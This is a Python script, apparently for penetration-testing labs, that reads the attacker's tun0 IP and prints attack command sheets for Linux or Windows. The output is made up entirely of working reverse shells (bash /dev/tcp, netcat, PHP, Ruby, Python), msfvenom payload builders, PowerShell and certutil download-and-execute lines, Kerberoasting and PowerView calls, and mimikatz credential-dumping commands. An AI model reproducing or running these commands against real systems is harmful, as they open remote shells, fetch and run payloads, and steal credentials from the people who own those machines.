#!/usr/bin/python3

import argparse
import netifaces as ni                                                                                                                                                                      
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']   
                                                                                                                                                                                            
def check(platform):
    if platform != "linux" and platform != "windows":
        raise argparse.ArgumentTypeError('Enter "linux" or "windows" as the platform')
    return platform

parser = argparse.ArgumentParser(description="Pulls the IP address from the tun0 interface. Assumes port 80. Assumes linux. Generates shells and other useful commands", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-p", "--port", default="80", type=str, help="Your port number")
parser.add_argument("-i", "--ip", default=ip, type=str, help="Your IP address")
parser.add_argument("-f", "--platform", default="linux", type=check, help="Windows or linux commands?")
#parser.add_argument("-e", "--encode", action=storeTrue help="Base64 encode the payload") #todo
args=parser.parse_args()

platform = args.platform
port = args.port
ip = args.ip

def main():
    if platform == "linux":
        print(f"""\
bash -i >& /dev/tcp/{ip}/{port} 0>&1
0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1

nc -e /bin/sh {ip} {port}
nc -e /bin/bash {ip} {port}
nc -c bash {ip} {port}
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
ncat {ip} {port} -e /bin/bash
ncat --udp {ip} {port} -e /bin/bash

<?php shell_exec("nc -e /bin/sh {ip} {port}"); ?>                                                                                                                                   [22/126]
php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'i
php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

export RHOST="{ip}";export RPORT={port};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
;pty.spawn("/bin/sh")'
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("{ip}",{port}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/
bash")

msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST={ip} LPORT={port}

python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=screen && stty rows 60 cols 116
wget http://{ip}:{port}/lin.sh && chmod +x lin.sh && ./lin.sh -a > enum
wget http://{ip}:{port}/spy

ping -c 4 {ip} """) 
     
    if platform == "windows":
        print(f"""\
cmd.exe /c "@echo open {ip} {port}>ftp.txt&@echo USER doubt>>ftp.txt&@echo PASS doubt>>ftp.txt&@echo binary>>ftp.txt&@echo GET /file>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

powershell IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/rev.ps1')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/winpeas.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://{ip}:{port}/winpeas.exe', 'winpeas.exe')
wget -UseBasicParsing "http://{ip}:{port}/m.exe" -OutFile m.exe
iwr http://{ip}:{port}/m.exe -OutFile m.exe

powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandPr
operty hash | out-file -Encoding ASCII kerb-Hash0.txt"
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/powerview.ps1') ; Get-NetSession -Computername dc01"
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/powerview.ps1') ; Get-NetLoggedon -Computername $(hostname)"

msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 12 -f exe -o rev.exe

ping {ip} 

certutil -urlcache -f http://{ip}:{port}/m.exe m.exe && .\m.exe
privilege::debug
sekurlsa::logonpasswords
token::elevate
lsadump::sam
sekurlsa::credman

powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/powerup.ps1') ; Invoke-AllChecks"
certutil -urlcache -f http://{ip}:{port}/win.exe win.exe && .\win.exe > enum
certutil -urlcache -f http://{ip}:{port}/nc.exe nc.exe
nc.exe {ip} {port} -e cmd """)

if __name__ == "__main__":
    main()
